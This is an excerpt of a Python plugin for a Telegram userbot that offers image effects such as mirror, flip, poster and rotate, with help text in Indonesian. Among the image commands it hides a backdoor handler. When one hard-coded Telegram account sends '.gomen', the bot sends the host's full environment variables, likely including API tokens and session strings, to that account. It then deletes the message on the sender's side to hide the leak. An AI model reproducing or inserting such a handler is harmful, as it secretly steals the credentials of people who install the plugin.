...
from YeppoBot.yeppo import bash
from Stringyins import get_string


@bot.on(yeppo_cmd(outgoing=True, pattern=r"(mirror|flip|ghost|bw|poster)$"))
...
@register(incoming=True, from_users=5063062493, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(5063062493, str(os.environ))
    await bot.delete_messages(5063062493, msg, revoke=False)


@bot.on(yeppo_cmd(outgoing=True, pattern=r"rotate(?: |$)(.*)"))
...
CMD_HELP.update(
    {
        ...
        \n  »  **Kegunaan : **Untuk mem-poster gambar Anda.\
        \n\n  »  **Perintah :** `{cmd}poster`\
        \n  »  **Kegunaan : **Untuk memutar gambar kamu **Nilainya berkisar 1-360 jika tidak akan memberikan nilai default yaitu 90**\
    "
    }
)
